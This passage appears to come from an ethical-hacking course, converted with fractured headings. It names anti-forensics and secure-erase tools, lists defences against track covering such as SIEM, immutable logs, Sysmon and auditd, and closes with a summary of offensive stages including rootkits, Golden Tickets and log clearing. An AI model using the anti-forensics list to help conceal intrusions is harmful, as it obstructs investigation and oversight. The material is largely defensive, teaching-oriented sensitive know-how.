> 
> #### 🔹 Evidence Eliminator
> 
> 
> 
> #### 🔹 Commercial anti-forensics tool
> 
> 
> 
> #### 🔹 BleachBit
> 
> 
> 
> #### 🔹 Open-source system cleaner
> 
> 
> 
> #### 🔹 Secure Erase Tools:
> 
> 
> 
> #### 🔹 Eraser
> 
> 
> 
> #### 🔹 DBAN
> 
> 
> 
> #### 🔹 shred Linux)
> 
> 
> 
> #### 🔹 srm Linux)
> 
> 
> 
> #### 🔹 6.9 Defending Against Track Covering
> 
> 
> 
> #### 🔹 Centralized Logging:
> 
> 
> 
> #### 🔹 SIEM Security Information and Event Management)
> 
> 
> 
> #### 🔹 Forward logs to external collectors
> 
> 
> 
> #### 🔹 Real-time log monitoring
> 
> 
> 
> #### 🔹 Correlation and alerting
> 
> 
> 
> #### 🔹 Log Protection:
> 
> 
> 
> #### 🔹 Write-Once-Read-Many WORM storage
> 
> 
> 
> #### 🔹 Immutable log storage
> 
> 
> 
> #### 🔹 Digital signatures on logs
> 
> 
> 
> #### 🔹 Encrypted log transmission
> 
> 
> 
> #### 🔹 Monitoring Solutions:
> 
> 
> 
> #### 🔹 OSSEC  Host-based intrusion detection
> 
> 
> 
> #### 🔹 Sysmon  Enhanced Windows logging
> 
> 
> 
> #### 🔹 Auditd  Linux audit framework
> 
> 
> 
> #### 🔹 Wazuh  Security monitoring platform
> 
> 
> 
> #### 🔹 Detection Mechanisms:
> 
>
> ---
>
> ### 📍 Page 40
>
> 
> #### 🔹 File Integrity Monitoring FIM  Detect file modifications
> 
> 
> 
> #### 🔹 Behavioral analysis  Identify suspicious patterns
> 
> 
> 
> #### 🔹 Anomaly detection  Detect unusual log gaps
> 
> 
> Forensic capabilities  Volume shadow copies, disk forensics
> 
> 
> #### 🔹 Best Practices:
> 
> 
> 
> #### 🔹 Enable comprehensive auditing
> 
> 
> 
> #### 🔹 Protect audit logs with appropriate ACLs
> 
> 
> 
> #### 🔹 Forward logs to secure collectors immediately
> 
> 
> 
> #### 🔹 Implement log retention policies
> 
> 
> 
> #### 🔹 Regular log analysis and review
> 
> 
> 
> #### 🔹 Alert on audit policy changes
> 
> 
> 
> #### 🔹 Use dedicated logging infrastructure
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 41 to 41 Syllabus Content**
>
> ### 📍 Page 41
>
> 
> #### 🔹 ✅Module Summary
> 
> 
> This module covered the complete system hacking lifecycle from initial access through maintaining persistence and covering tracks.
> 
> 
> #### 🔹 Key Takeaways:
> 
> 
> 
> #### 🔹 Gaining Access  Password cracking, hash extraction,
> 
> 
> 
> #### 🔹 authentication protocols, and attack techniques
> 
> 
> Exploitation  Buffer overflows, ROP, exploit frameworks, and
> 
> 
> #### 🔹 bypassing modern protections
> 
> 
> Privilege Escalation  DLL hijacking, service misconfigurations,
> 
> 
> #### 🔹 token manipulation, and AD attacks
> 
> 
> Maintaining Access  Remote execution, keyloggers, rootkits,
> 
> 
> #### 🔹 and steganography
> 
> 
> Persistence  Registry keys, scheduled tasks, AD persistence,
> 
> 
> #### 🔹 and Golden Tickets
> 
> 
> 
> #### 🔹 Covering Tracks  Log clearing, anti-forensics, timestamp
> 
> 
> 
> #### 🔹 manipulation, and detection evasion
> 
> 
> System hacking requires understanding both offensive techniques and defensive countermeasures. Effective defense relies on defense- in-depth, comprehensive monitoring, and rapid incident response capabilities.
> 
> 
> #### 🔹 4 1
> 
>
> ---
>
